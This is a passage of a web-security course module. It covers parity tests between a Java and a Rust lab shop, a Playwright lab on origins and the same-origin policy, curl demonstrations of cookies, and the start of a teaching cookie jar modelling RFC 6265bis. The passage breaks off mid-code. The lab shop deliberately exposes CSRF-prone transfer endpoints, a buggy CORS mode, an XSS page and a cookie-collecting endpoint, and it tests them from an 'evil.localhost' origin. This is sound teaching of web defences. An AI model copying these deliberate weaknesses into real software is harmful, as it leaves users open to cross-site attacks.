`parity.sh` runs a fixed battery of 40 requests against each shop (cookie bench, login in four configurations, the six transfer endpoints,  
the nine CORS policies, three preflights, the XSS page, logout) and compares the transcripts.  

Date fields, session ids and CSRF tokens are masked because they are random or clock-dependent:

```sh
#!/bin/bash
# Runs the battery against the Java shop (9400) and the Rust shop (9401), then compares the two transcripts.
./parity_run.sh 9400 | sed 's/9400/PORT/g' > out/parity_java.txt
./parity_run.sh 9401 | sed 's/9401/PORT/g' > out/parity_rust.txt
echo "requests: $(grep -c '^\$ ' out/parity_java.txt)"
if diff out/parity_java.txt out/parity_rust.txt > out/parity_diff.txt; then echo "Java and Rust transcripts are identical ($(wc -l < out/parity_java.txt) lines)"; else echo "DIFFERENCES:"; cat out/parity_diff.txt; fi
```

```sh
#!/bin/bash
# Sends a fixed battery of 40 requests to one shop origin and prints a normalised transcript:
# status line, response fields (without Date) and body, with random session ids and CSRF tokens masked.
# Usage: ./parity_run.sh <port>
P=$1
B=http://shop.localhost:$P
JAR=$(mktemp)
norm() { tr -d '\r' | grep -v '^Date:' | sed -E 's/(sid=)[A-Za-z0-9_-]{22}/\1<id>/; s/(name="csrf" value=")[A-Za-z0-9_-]{16}/\1<csrf>/'; }
req() { echo "\$ $*"; curl -s --noproxy '' -i -b "$JAR" -c "$JAR" "$@" | norm; echo; }
curl -s --noproxy '' -X POST $B/__reset > /dev/null
req "$B/set?c=a%3D1%3B%20Path%3D%2F&c=b%3D2%3B%20Secure%3B%20HttpOnly&c=c%3D3%3B%20SameSite%3DNone%3B%20Secure"
req -H 'Cookie: a=1; b=2; a=3' $B/echo
req -H 'Origin: http://evil.localhost:'$P -H 'Sec-Fetch-Site: cross-site' $B/echo
req $B/
req -d 'user=alice&password=wrong' $B/login
req -d 'user=alice&password=wonderland' "$B/login?samesite=strict&prefix=host"
req -d 'user=alice&password=wonderland' "$B/login?samesite=none&httponly=off&domain=on"
req -d 'user=alice&password=wonderland' "$B/login"
req $B/account
req -d 'to=bob&amount=100' $B/transfer
req -d 'to=bob&amount=100' $B/transfer-token
req -H 'Origin: http://evil.localhost:'$P -d 'to=bob&amount=100' $B/transfer-origin
req -H 'Origin: http://shop.localhost:'$P -d 'to=bob&amount=100' $B/transfer-origin
req -H 'Sec-Fetch-Site: cross-site' -d 'to=bob&amount=1' $B/transfer-fetchmeta
req -H 'Content-Type: application/json' -d '{"to":"bob","amount":5}' $B/transfer-json
req -d 'to=bob&amount=5' $B/transfer-json
req "$B/transfer-get?to=bob&amount=1"
req "$B/transfer-get?to=nobody&amount=1"
req "$B/transfer-get?to=bob&amount=99999"
req $B/state
req "$B/search?q=%3Cb%3Ehi%3C/b%3E"
req "$B/collect?c=sid%3Dabc&c=more&x=1"
for mode in none star echo echo-vary creds starcreds allowlist containsbug null; do
  req -H "Origin: http://app.shop.localhost:$P" "$B/api/data?cors=$mode&expose=on"
done
req -H "Origin: http://evil-shop.localhost:$P" "$B/api/data?cors=containsbug"
req -X OPTIONS -H "Origin: http://app.shop.localhost:$P" -H 'Access-Control-Request-Method: PUT' -H 'Access-Control-Request-Headers: content-type,x-token' "$B/api/data?cors=allowlist"
req -X OPTIONS -H "Origin: http://evil.localhost:$P" -H 'Access-Control-Request-Method: PUT' "$B/api/data?cors=allowlist&pf=nohdr"
req -X OPTIONS -H "Origin: http://app.shop.localhost:$P" -H 'Access-Control-Request-Method: PUT' "$B/api/data?cors=star&pf=500"
req -X PUT -H "Origin: http://app.shop.localhost:$P" "$B/api/data?cors=creds"
req -X POST -i $B/logout
req $B/account
req $B/nosuch
req $B/login
rm -f "$JAR"
echo "--- log"
curl -s --noproxy '' $B/__log
```

```text
requests: 40
Java and Rust transcripts are identical (434 lines)
```

Verification note: every output in this module was produced by running the code shown, on JDK 21, Rust 1.97, Node 22,  
Playwright 1.63 with Chromium 153, `curl` 8.5 and Linux 6.18, by `run_all_labs.sh` against freshly started servers and by `run_exercises.sh`.  

The decisions, the matrices, the sizes and the messages will be the same on your machine.  
Times, random session ids (masked as `<id>`, `<A>`, `<B>`), the absolute expiry in the `curl` cookie file and the exact count in the cookie-limit test depend on your machine, your clock and your Chromium build.

### Lab 01: origins and the same-origin policy

Goal: read the browser's own verdict on the relation between two URLs, watch the same-origin policy hide a response that the server sent, and see that cookies ignore the port.

`drivers/lib.js` holds the helpers every browser driver shares (the shop's port, `url()`, resetting the shop, parsing its log). `drivers/origins.js` is Lab 01:

```js
// Shared helpers for the browser labs: Playwright launches Chromium, the shop's /__log tells what the server saw.
// The browser maps every *.localhost name to 127.0.0.1 by itself, so no /etc/hosts entries are needed.
const { chromium } = require('playwright');

const PORT = process.env.PORT || '9400';
const admin = port => `http://127.0.0.1:${port}`;
const sleep = ms => new Promise(r => setTimeout(r, ms));
const url = (host, path, port = PORT) => `http://${host}:${port}${path}`;

async function reset(port = PORT) { await fetch(`${admin(port)}/__reset`, { method: 'POST' }); }
async function clearLog(port = PORT) { await fetch(`${admin(port)}/__log?clear=1`); }

// Parses the shop's log lines: METHOD host/path  cookies=[a,b]  user=..  origin=..  sf-site=..  sf-mode=..  sf-dest=..  -> 200 note
async function readLog(port = PORT) {
  const text = await (await fetch(`${admin(port)}/__log`)).text();
  return text.split('\n').filter(Boolean).map(line => {
    const m = line.match(/^(\S+)\s+([^\/\s]+)(\/\S*)\s+cookies=\[([^\]]*)\](.*?)  -> (\d+)(.*)$/);
    const rec = { line, method: m[1], host: m[2], path: m[3], cookies: m[4] ? m[4].split(',') : [], status: +m[6], note: m[7].trim() };
    for (const kv of m[5].trim().split(/\s{2,}/).filter(Boolean)) { const i = kv.indexOf('='); rec[kv.slice(0, i)] = kv.slice(i + 1); }
    return rec;
  });
}

async function launch(extra = {}) { return chromium.launch(extra); }

// Waits until the page and its sub-requests have been quiet for a moment.
async function settle(page, ms = 250) { await page.waitForLoadState('load').catch(() => {}); await sleep(ms); }

const pad = (s, n) => String(s).padEnd(n);
module.exports = { PORT, url, sleep, reset, clearLog, readLog, launch, settle, pad };
```

```js
// Lab 01: origins, sites and the same-origin policy, as Chromium sees them.
//   Part A  for pairs of URLs: are they the same origin (URL rules) and what does the browser call the relationship
//           (the Sec-Fetch-Site header it sends)?
//   Part B  what the same-origin policy lets a script do with a cross-origin response
//   Part C  cookies are not scoped by port: a cookie set through one origin reaches another port of the same host
const { url, reset, clearLog, readLog, launch, settle, pad, PORT } = require('./lib');

(async () => {
  await reset();
  const browser = await launch();
  const ctx = await browser.newContext();
  const page = await ctx.newPage();

  console.log('== Part A: origin and site ==');
  const pairs = [
    ['shop.localhost', PORT, 'shop.localhost', PORT],
    ['shop.localhost', PORT, 'shop.localhost', '9401'],
    ['shop.localhost', PORT, 'api.shop.localhost', PORT],
    ['api.shop.localhost', PORT, 'blog.shop.localhost', PORT],
    ['shop.localhost', PORT, 'evil.localhost', PORT],
    ['evil-shop.localhost', PORT, 'shop.localhost', PORT],
  ];
  console.log(pad('page', 34) + pad('requests', 34) + pad('same origin?', 14) + 'Sec-Fetch-Site');
  for (const [ph, pp, th, tp] of pairs) {
    await clearLog(tp);
    await page.goto(url(ph, '/blank', pp));
    const target = url(th, '/echo', tp);
    await page.evaluate(t => fetch(t, { mode: 'no-cors' }).catch(() => {}), target);
    await settle(page);
    const rec = (await readLog(tp)).find(r => r.path === '/echo');
    const sameOrigin = await page.evaluate(t => new URL(t).origin === location.origin, target);
    console.log(pad(`${ph}:${pp}`, 34) + pad(`${th}:${tp}`, 34) + pad(sameOrigin ? 'yes' : 'no', 14) + (rec ? rec['sf-site'] : '(the other server is not running)'));
  }

  console.log('\n== Part B: what a script on evil.localhost can do with a response from shop.localhost ==');
  await clearLog();
  await page.goto(url('evil.localhost', '/blank'));
  const shopEcho = url('shop.localhost', '/echo');
  const results = await page.evaluate(async (target) => {
    const out = {};
    try { const r = await fetch(target); out.fetchDefault = `read it: status ${r.status}`; }
    catch (e) { out.fetchDefault = `blocked: ${e.name}: ${e.message}`; }
    const r2 = await fetch(target, { mode: 'no-cors' });
    out.fetchNoCors = `type=${r2.type} status=${r2.status} body length=${(await r2.text()).length}`;
    const frame = document.createElement('iframe');
    frame.src = target;
    document.body.appendChild(frame);
    await new Promise(res => { frame.onload = res; });
    out.iframe = 'contentDocument is ' + (frame.contentDocument === null ? 'null' : 'readable');
    try { out.iframe2 = 'read it: ' + frame.contentWindow.document.body.innerText.length + ' characters'; }
    catch (e) { out.iframe2 = `blocked: ${e.name}`; }
    return out;
  }, shopEcho);
  await settle(page);
  console.log('fetch(shop /echo)                     ' + results.fetchDefault);
  console.log("fetch(shop /echo, {mode: 'no-cors'})  " + results.fetchNoCors);
  console.log('iframe.contentDocument                ' + results.iframe);
  console.log('iframe.contentWindow.document         ' + results.iframe2);
  const reached = (await readLog()).filter(r => r.path === '/echo');
  console.log(`requests that reached the shop: ${reached.length}, all with Sec-Fetch-Site ${[...new Set(reached.map(r => r['sf-site']))].join(', ')}`);

  console.log('\n== Part C: cookies ignore the port ==');
  await page.goto(url('shop.localhost', '/set?c=' + encodeURIComponent('shared=set-through-9400')));
  console.log(`set by   http://shop.localhost:${PORT}   (the Java shop)`);
  for (const p of [PORT, '9401']) {
    await page.goto(url('shop.localhost', '/echo', p));
    const body = await page.innerText('body');
    console.log(`sent to  http://shop.localhost:${p}   ` + body.split('\n').find(l => l.startsWith('cookie:')));
  }
  await browser.close();
})();
```

Run: `node drivers/origins.js` (the Java shop must be running).

```text
== Part A: origin and site ==
page                              requests                          same origin?  Sec-Fetch-Site
shop.localhost:9400               shop.localhost:9400               yes           same-origin
shop.localhost:9400               shop.localhost:9401               no            same-site
shop.localhost:9400               api.shop.localhost:9400           no            same-site
api.shop.localhost:9400           blog.shop.localhost:9400          no            same-site
shop.localhost:9400               evil.localhost:9400               no            cross-site
evil-shop.localhost:9400          shop.localhost:9400               no            cross-site

== Part B: what a script on evil.localhost can do with a response from shop.localhost ==
fetch(shop /echo)                     blocked: TypeError: Failed to fetch
fetch(shop /echo, {mode: 'no-cors'})  type=opaque status=0 body length=0
iframe.contentDocument                contentDocument is null
iframe.contentWindow.document         blocked: SecurityError
requests that reached the shop: 3, all with Sec-Fetch-Site cross-site

== Part C: cookies ignore the port ==
set by   http://shop.localhost:9400   (the Java shop)
sent to  http://shop.localhost:9400   cookie: shared=set-through-9400
sent to  http://shop.localhost:9401   cookie: shared=set-through-9400
```

What to notice:

- **Part A is Chromium's verdict, not a calculation.**  
  The driver loads a page, makes a `fetch` to each URL and reads the `Sec-Fetch-Site` the shop logged.  
  Only the identical origin is `same-origin`.  
  A different port is `same-site`. `api.shop.localhost` is `same-site` with `shop.localhost`.  
  `evil.localhost` is `cross-site`, and so is `evil-shop.localhost`: a name that ends in the same letters is not a subdomain, only a dot-separated label boundary counts.

- **Part B: the same-origin policy hides, it does not block.**  
  The `fetch` fails with `TypeError: Failed to fetch`. In `no-cors` mode the request is made and an *opaque* response comes back with status 0 and an empty body.  
  The iframe's `contentDocument` is `null` and its `contentWindow.document` throws `SecurityError`.  
  The last line, 3 requests that reached the shop, is the point: a request is made in every case.

- **Part C: the cookie went to port 9401.** It was set through port 9400 and sent to both. Cookies do not know ports.

Things to try:

01. Right after the lab, `curl -s --noproxy '' http://127.0.0.1:9400/__log | tail -5` prints the shop's view of Part B and C.  
  The three cross-site lines read `sf-site=cross-site`, with `sf-mode=cors` and an `origin=` for the `fetch`, `sf-mode=no-cors`  
  and no `Origin` for the opaque request, and `sf-mode=navigate sf-dest=iframe` for the frame.

02. Add a seventh pair to Part A that you think is `same-site` and check the verdict, for example `api.shop.localhost:9400` to `shop.localhost:9400` in the other direction.

### Lab 02: cookies on the wire

Goal: see `Set-Cookie` and `Cookie` in `curl`, then build the model of RFC 6265bis 5.5 to 5.8 as a program (the teaching jar) that prints the reason for every decision,  
check it against `curl` and Chromium, and measure the limits and the prefixes.

**Part A: the wire.** `lab02_wire.cmds`, run with `./play.sh lab02_wire.cmds`.  
The cookie bench (`/set`) sends back whatever `Set-Cookie` fields the query asks for:

```sh
# 1. The server sets two cookies: two Set-Cookie fields, never one combined field
./wire.sh -G http://shop.localhost:9400/set --data-urlencode 'c=theme=dark; Path=/; Max-Age=3600' --data-urlencode 'c=sid=abc123; Path=/; HttpOnly; SameSite=Lax'

# 2. A client with a cookie jar stores them, and sends them back in ONE Cookie field
rm -f out/jar.txt
curl -s --noproxy '' -c out/jar.txt -o /dev/null -G http://shop.localhost:9400/set --data-urlencode 'c=theme=dark; Path=/; Max-Age=3600' --data-urlencode 'c=sid=abc123; Path=/; HttpOnly; SameSite=Lax'
cat out/jar.txt
./wire.sh http://shop.localhost:9400/echo -b out/jar.txt

# 3. The server sees one field and splits it at "; ": names and values, nothing else
curl -s --noproxy '' -b out/jar.txt http://shop.localhost:9400/echo | head -2

# 4. A cookie is deleted by setting it again, with the same name, Domain and Path, and Max-Age=0 or a date in the past
./wire.sh -G http://shop.localhost:9400/set --data-urlencode 'c=theme=; Path=/; Max-Age=0' -b out/jar.txt -c out/jar.txt
./wire.sh http://shop.localhost:9400/echo -b out/jar.txt

# 5. An Expires date contains a comma, which is why Set-Cookie fields cannot be folded into one comma-separated field
./wire.sh -G http://shop.localhost:9400/set --data-urlencode 'c=a=1; Expires=Thu, 05 Nov 2026 12:00:00 GMT' --data-urlencode 'c=b=2; Expires=Fri, 06 Nov 2026 12:00:00 GMT'

# 6. A hand-written Cookie field: names may repeat, and the server sees them in the order sent
./wire.sh http://shop.localhost:9400/echo -H 'Cookie: sid=abc123; theme=dark; theme=light'

# 7. Host-only against Domain: a cookie set without Domain stays with the exact host
rm -f out/jar2.txt
curl -s --noproxy '' -c out/jar2.txt -o /dev/null -G http://shop.localhost:9400/set --data-urlencode 'c=hostonly=1' --data-urlencode 'c=wide=1; Domain=shop.localhost'
cat out/jar2.txt
./wire.sh http://api.shop.localhost:9400/echo -b out/jar2.txt
```

```text
# 1. The server sets two cookies: two Set-Cookie fields, never one combined field
$ ./wire.sh -G http://shop.localhost:9400/set --data-urlencode 'c=theme=dark; Path=/; Max-Age=3600' --data-urlencode 'c=sid=abc123; Path=/; HttpOnly; SameSite=Lax'
> GET /set?c=theme%3ddark%3b+Path%3d%2f%3b+Max-Age%3d3600&c=sid%3dabc123%3b+Path%3d%2f%3b+HttpOnly%3b+SameSite%3dLax HTTP/1.1
> Host: shop.localhost:9400
> 
< HTTP/1.1 200 OK
< Set-Cookie: theme=dark; Path=/; Max-Age=3600
< Set-Cookie: sid=abc123; Path=/; HttpOnly; SameSite=Lax
< 


# 2. A client with a cookie jar stores them, and sends them back in ONE Cookie field
$ rm -f out/jar.txt

$ curl -s --noproxy '' -c out/jar.txt -o /dev/null -G http://shop.localhost:9400/set --data-urlencode 'c=theme=dark; Path=/; Max-Age=3600' --data-urlencode 'c=sid=abc123; Path=/; HttpOnly; SameSite=Lax'

$ cat out/jar.txt
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_shop.localhost FALSE / FALSE 0 sid abc123
shop.localhost FALSE/FALSE 1793173322 theme dark

$ ./wire.sh http://shop.localhost:9400/echo -b out/jar.txt
> GET /echo HTTP/1.1
> Host: shop.localhost:9400
> Cookie: theme=dark; sid=abc123
> 
< HTTP/1.1 200 OK
< 


# 3. The server sees one field and splits it at "; ": names and values, nothing else
$ curl -s --noproxy '' -b out/jar.txt http://shop.localhost:9400/echo | head -2
host: shop.localhost:9400
cookie: theme=dark; sid=abc123


# 4. A cookie is deleted by setting it again, with the same name, Domain and Path, and Max-Age=0 or a date in the past
$ ./wire.sh -G http://shop.localhost:9400/set --data-urlencode 'c=theme=; Path=/; Max-Age=0' -b out/jar.txt -c out/jar.txt
> GET /set?c=theme%3d%3b+Path%3d%2f%3b+Max-Age%3d0 HTTP/1.1
> Host: shop.localhost:9400
> Cookie: theme=dark; sid=abc123
> 
< HTTP/1.1 200 OK
< Set-Cookie: theme=; Path=/; Max-Age=0
< 

$ ./wire.sh http://shop.localhost:9400/echo -b out/jar.txt
> GET /echo HTTP/1.1
> Host: shop.localhost:9400
> Cookie: sid=abc123
> 
< HTTP/1.1 200 OK
< 


# 5. An Expires date contains a comma, which is why Set-Cookie fields cannot be folded into one comma-separated field
$ ./wire.sh -G http://shop.localhost:9400/set --data-urlencode 'c=a=1; Expires=Thu, 05 Nov 2026 12:00:00 GMT' --data-urlencode 'c=b=2; Expires=Fri, 06 Nov 2026 12:00:00 GMT'
> GET /set?c=a%3d1%3b+Expires%3dThu%2c+05+Nov+2026+12%3a00%3a00+GMT&c=b%3d2%3b+Expires%3dFri%2c+06+Nov+2026+12%3a00%3a00+GMT HTTP/1.1
> Host: shop.localhost:9400
> 
< HTTP/1.1 200 OK
< Set-Cookie: a=1; Expires=Thu, 05 Nov 2026 12:00:00 GMT
< Set-Cookie: b=2; Expires=Fri, 06 Nov 2026 12:00:00 GMT
< 


# 6. A hand-written Cookie field: names may repeat, and the server sees them in the order sent
$ ./wire.sh http://shop.localhost:9400/echo -H 'Cookie: sid=abc123; theme=dark; theme=light'
> GET /echo HTTP/1.1
> Host: shop.localhost:9400
> Cookie: sid=abc123; theme=dark; theme=light
> 
< HTTP/1.1 200 OK
< 


# 7. Host-only against Domain: a cookie set without Domain stays with the exact host
$ rm -f out/jar2.txt

$ curl -s --noproxy '' -c out/jar2.txt -o /dev/null -G http://shop.localhost:9400/set --data-urlencode 'c=hostonly=1' --data-urlencode 'c=wide=1; Domain=shop.localhost'

$ cat out/jar2.txt
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

.shop.localhost TRUE / FALSE 0 wide 1
shop.localhost  FALSE / FALSE 0 hostonly 1

$ ./wire.sh http://api.shop.localhost:9400/echo -b out/jar2.txt
> GET /echo HTTP/1.1
> Host: api.shop.localhost:9400
> Cookie: wide=1
> 
< HTTP/1.1 200 OK
< 
```

What to notice:

- **Step 01: two cookies, two fields.** `curl -G --data-urlencode` builds the query; the response has two `Set-Cookie` lines.

- **Step 02: the jar file.** `curl` keeps cookies in a Netscape-format file: seven tab-separated columns (domain, include-subdomains flag, path, secure flag, expiry, name, value).  
`#HttpOnly_` in front of the domain marks `sid`.  
`theme` has an absolute expiry (the number differs on your machine: it is now plus 3600 seconds) and `sid`, a session cookie, has 0.  
The next request carries **one** `Cookie` field with both.

- **Step 03: the server's view.** `cookie: theme=dark; sid=abc123`, names and values and no attributes.  
  The server cannot tell that `sid` is `HttpOnly`.

- **Step 04: deletion.** The request sets `theme=` with `Max-Age=0` and the next request carries only `sid`.

- **Step 05: why not combined.** The two `Expires` dates contain commas (`Thu, 05 Nov 2026`), so a combined `Set-Cookie: a=1; Expires=Thu, 05 Nov ..., b=2; ...` could not be split back (H07).  
  Each stays its own field.

- **Step 06: a hand-written `Cookie` field** with `theme` twice. The server receives both, in the order sent.

- **Step 07: scope.** `hostonly` has `FALSE` in the include-subdomains column and `wide` has `TRUE` with a leading dot in the domain.  
  A request to `api.shop.localhost` carries `wide=1` only.

**Part B: the teaching jar.**  
The jar is a program: it reads a scenario file, applies each `set` and `get` with the algorithms of 10.02, and prints what it decided and why.  
`java java/CookieJar.java scenarios/s01_scope.txt`.  
The Java source first, then the Rust twin, then the scenarios and their output:

```java
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.Locale;
import java.util.Set;

// A teaching cookie jar: the storage and retrieval model of RFC 6265bis (draft 22) sections 5.5 to 5.8, plus the
// browser rules around it (prefixes, SameSite, the 400-day cap, "leave Secure cookies alone"). It is driven by a
// scenario file so that every decision, and its reason, is printed. The Rust twin is cookie_jar.rs.
//
//   now <epoch-seconds>                           sets the jar's clock
//   advance <seconds>                             moves the clock forward
//   secure-localhost on                           treat http://localhost and http://*.localhost as secure, as browsers do
//   set <url> [options] <Set-Cookie field value>  a response from <url> sets a cookie
//   get <url> [options]                           a request to <url>: which cookies go with it?
// Options (for set and get): --site=<url|none>  the "site for cookies": the top-level page the request belongs to
//                                               (default: the request's own URL, i.e. first-party)
//                            --nav              a top-level navigation (the user's address bar or a clicked link)
//                            --method=<M>       the request method (default GET)
//                            --script           the cookie API of a script (document.cookie), not HTTP
// Usage: java CookieJar.java <scenario-file>
public class CookieJar {
    static final long MAX_LIFETIME = 400L * 86400;                       // the 400-day cap Chrome applies and the draft recommends
    static final long LAX_POST_WINDOW = 120;                             // Chrome's "Lax+POST" window for cookies without SameSite
    static final DateTimeFormatter HTTP_DATE = DateTimeFormatter.ofPattern("EEE, dd MMM yyyy HH:mm:ss 'GMT'", Locale.US);
    // A tiny public suffix list. Real browsers use the full list from publicsuffix.org (about 10,000 rules).
    static final Set<String> SUFFIXES = Set.of("com", "org", "net", "edu", "io", "uk", "co.uk", "github.io", "localhost", "test");

    static boolean secureLocalhost = false;
    static long now = 1793188800L;                                       // 2026-10-28 12:00:00 UTC
    static final List<Cookie> JAR = new ArrayList<>();
    static long createdCounter = 0;

    static final class Cookie {
        String name, value, domain, path, sameSite;                      // sameSite: null (not given), Lax, Strict, None
        boolean hostOnly, secure, httpOnly;
        Long expiry;                                                      // null: a session cookie
        long created, seq;
    }

    record Url(String scheme, String host, String path) {
        boolean secure() { return scheme.equals("https") || (secureLocalhost && (host.equals("localhost") || host.endsWith(".localhost"))); }
    }

    record Ctx(Url site, boolean nav, String method, boolean script) { }

    public static void main(String[] args) throws Exception {
        for (String line : Files.readAllLines(Path.of(args[0]))) {
            line = line.strip();
            if (line.isEmpty() || line.startsWith("#")) { System.out.println(line); continue; }
            String[] t = line.split("\\s+", 3);
            switch (t[0]) {
                case "now" -> now = Long.parseLong(t[1]);
                case "secure-localhost" -> { secureLocalhost = t[1].equals("on"); System.out.println(line); }
                case "advance" -> { now += Long.parseLong(t[1]); System.out.println(line); }
                case "set" -> { System.out.println(line); set(parseUrl(t[1]), t.length > 2 ? t[2] : ""); }
                case "get" -> { System.out.println(line); get(parseUrl(t[1]), t.length > 2 ? t[2] : ""); }
                default -> throw new IllegalArgumentException(line);
            }
        }
    }

    // ---------------------------------------------------------------- URLs, sites, matching (RFC 6265bis 5.1)

    static Url parseUrl(String s) {
        int i = s.indexOf("://");
        String scheme = s.substring(0, i);
        String rest = s.substring(i + 3);
        int slash = rest.indexOf('/');
        String hostPort = slash < 0 ? rest : rest.substring(0, slash);
        String path = slash < 0 ? "/" : rest.substring(slash);
        int q = path.indexOf('?');
        if (q >= 0) path = path.substring(0, q);
        return new Url(scheme, hostPort.replaceFirst(":\\d+$", "").toLowerCase(Locale.ROOT), path);
    }

    static boolean isIp(String host) { return host.matches("\\d+\\.\\d+\\.\\d+\\.\\d+") || host.contains(":"); }

    static boolean domainMatch(String host, String domain) {
        return host.equals(domain) || (host.endsWith("." + domain) && !isIp(host));
    }

    static boolean pathMatch(String requestPath, String cookiePath) {
        if (requestPath.equals(cookiePath)) return true;
        return requestPath.startsWith(cookiePath) && (cookiePath.endsWith("/") || requestPath.charAt(cookiePath.length()) == '/');
    }

    static String defaultPath(String path) {
        if (!path.startsWith("/") || path.indexOf('/', 1) < 0) return "/";
        return path.substring(0, path.lastIndexOf('/'));
    }

    static boolean publicSuffix(String domain) { return SUFFIXES.contains(domain); }

    // The registrable domain ("site") of a host: the longest public suffix plus one label; the last label if no rule matches.
    static String site(String host) {
        if (isIp(host)) return host;
        String[] labels = host.split("\\.");
        int suffixLabels = 1;
        for (int n = labels.length; n >= 1; n--) {
            if (publicSuffix(String.join(".", java.util.Arrays.copyOfRange(labels, labels.length - n, labels.length)))) { suffixLabels = n; break; }
        }
        int take = Math.min(labels.length, suffixLabels + 1);
        return String.join(".", java.util.Arrays.copyOfRange(labels, labels.length - take, labels.length));
    }

    static boolean sameSite(Url request, Url siteForCookies) {
        return siteForCookies != null && request.scheme().equals(siteForCookies.scheme())
                && site(request.host()).equals(site(siteForCookies.host()));
    }

    // ---------------------------------------------------------------- options

    record Parsed(Ctx ctx, String rest) { }

    static Parsed options(Url url, String s) {
        Url site = url;
        boolean nav = false, script = false;
        String method = "GET";
        s = s.strip();
        while (s.startsWith("--")) {
            String[] t = s.split("\\s+", 2);
            String o = t[0];
            if (o.equals("--nav")) nav = true;
            else if (o.equals("--script")) script = true;
            else if (o.startsWith("--method=")) method = o.substring(9);
            else if (o.startsWith("--site=")) site = o.substring(7).equals("none") ? null : parseUrl(o.substring(7));
            s = t.length > 1 ? t[1].strip() : "";
        }
        return new Parsed(new Ctx(site, nav, method, script), s);
    }

    // ---------------------------------------------------------------- storage (5.7)

    static void set(Url url, String optionsAndField) {
        Parsed p = options(url, optionsAndField);
        System.out.println("  -> " + store(url, p.ctx(), p.rest()));
    }

    static String store(Url url, Ctx ctx, String field) {
        if (field.length() > 4096) return "ignored: the field is longer than 4096 bytes";
        String[] parts = field.split(";", -1);
        String first = parts[0];
        String name, value;
        int eq = first.indexOf('=');
        if (eq < 0) { name = ""; value = first.strip(); } else { name = first.substring(0, eq).strip(); value = first.substring(eq + 1).strip(); }
        if (name.isEmpty() && value.isEmpty()) return "ignored: empty name and value";
        if (name.length() + value.length() > 4096) return "ignored: name and value together exceed 4096 bytes";
        String domainAttr = null, pathAttr = null, sameSite = null, expiresAttr = null;
        boolean secure = false, httpOnly = false;
        Long maxAge = null;
        Long expires = null;
        for (int i = 1; i < parts.length; i++) {
            String av = parts[i];
            int e = av.indexOf('=');
            String an = (e < 0 ? av : av.substring(0, e)).strip().toLowerCase(Locale.ROOT);
            String avv = e < 0 ? "" : av.substring(e + 1).strip();
            if (avv.length() > 1024) continue;                           // an over-long attribute value is skipped
            switch (an) {
                case "expires" -> { Long d = parseDate(avv); if (d != null) expires = d; }
                case "max-age" -> {
                    if (avv.matches("-?\\d+")) {
                        try { maxAge = Long.parseLong(avv); } catch (NumberFormatException x) { maxAge = avv.startsWith("-") ? Long.MIN_VALUE : Long.MAX_VALUE; }
                    }
                }
                case "domain" -> { String d = avv.startsWith(".") ? avv.substring(1) : avv; if (!d.isEmpty()) domainAttr = d.toLowerCase(Locale.ROOT); }
                case "path" -> { if (avv.startsWith("/")) pathAttr = avv; }
                case "secure" -> secure = true;
                case "httponly" -> httpOnly = true;
                case "samesite" -> {
                    String v = avv.toLowerCase(Locale.ROOT);
                    sameSite = v.equals("strict") ? "Strict" : v.equals("lax") ? "Lax" : v.equals("none") ? "None" : null;
                }
                default -> { }
            }
        }
        var c = new Cookie();
        c.name = name; c.value = value; c.secure = secure; c.httpOnly = httpOnly; c.sameSite = sameSite;
        String host = url.host();
        if (domainAttr != null) {
            if (publicSuffix(domainAttr)) {
                if (!domainAttr.equals(host)) return "ignored: Domain=" + domainAttr + " is a public suffix";
                domainAttr = null;                                       // a host that is itself a suffix: treat as host-only
            }
        }
        if (domainAttr != null) {
            if (!domainMatch(host, domainAttr)) return "ignored: Domain=" + domainAttr + " does not domain-match " + host;
            c.hostOnly = false; c.domain = domainAttr;
        } else {
            c.hostOnly = true; c.domain = host;
        }
        c.path = pathAttr != null ? pathAttr : defaultPath(url.path());
        if (secure && !url.secure()) return "ignored: Secure cookie from an insecure URL";
        if (httpOnly && ctx.script()) return "ignored: HttpOnly cookie set from a script API";
        if ("None".equals(sameSite) && !secure) return "ignored: SameSite=None without Secure";
        if (!"None".equals(sameSite) && !sameSite(url, ctx.site())) {
            return "ignored: " + (sameSite == null ? "default (Lax)" : "SameSite=" + sameSite) + " cookie set from a cross-site context";
        }
        String lower = name.toLowerCase(Locale.ROOT);
        if (lower.startsWith("__secure-") && !secure) return "ignored: __Secure- prefix needs Secure";
        if (lower.startsWith("__host-")) {
            if (!secure) return "ignored: __Host- prefix needs Secure";
            if (!c.hostOnly) return "ignored: __Host- prefix forbids Domain";
            if (!c.path.equals("/")) return "ignored: __Host- prefix needs Path=/";
        }
        if (lower.startsWith("__http-")) {
            if (!secure) return "ignored: __Http- prefix needs Secure";
            if (!httpOnly) return "ignored: __Http- prefix needs HttpOnly";
        }
        if (lower.startsWith("__host-http-") && !httpOnly) return "ignored: __Host-Http- prefix needs HttpOnly";
        if (maxAge != null) c.expiry = maxAge <= 0 ? Long.valueOf(0) : Long.valueOf(now + Math.min(maxAge, MAX_LIFETIME));
        else if (expires != null) c.expiry = Math.min(expires, now + MAX_LIFETIME);
        Cookie old = find(c);
        if (c.expiry != null && c.expiry <= now) {
            if (old == null) return "ignored: already expired, and there was nothing to remove";
            JAR.remove(old);
            return "removed " + describeKey(c);
        }
        if (!c.secure && !url.secure()) {                                // leave Secure cookies alone
            for (Cookie o : JAR) {
                if (o.secure && o.name.equals(c.name) && (domainMatch(c.domain, o.domain) || domainMatch(o.domain, c.domain))
                        && (pathMatch(c.path, o.path) || pathMatch(o.path, c.path))) {
                    return "ignored: would overwrite a Secure cookie from an insecure URL";
                }
            }
        }
        c.seq = ++createdCounter;
        c.created = now;
        if (old != null) { c.created = old.created; c.seq = old.seq; JAR.remove(old); }
        JAR.add(c);
        return (old != null ? "replaced " : "stored ") + describe(c);
    }

    static Cookie find(Cookie c) {
        for (Cookie o : JAR) {
            if (o.name.equals(c.name) && o.domain.equals(c.domain) && o.path.equals(c.path) && o.hostOnly == c.hostOnly) return o;
        }
        return null;
    }

    static String describeKey(Cookie c) { return c.name + " (" + (c.hostOnly ? "host-only " : "domain ") + c.domain + ", path " + c.path + ")"; }

    static String describe(Cookie c) {
        var sb = new StringBuilder(c.name + "=" + c.value + " (" + (c.hostOnly ? "host-only " : "domain ") + c.domain + ", path " + c.path);
        if (c.secure) sb.append(", Secure");
        if (c.httpOnly) sb.append(", HttpOnly");
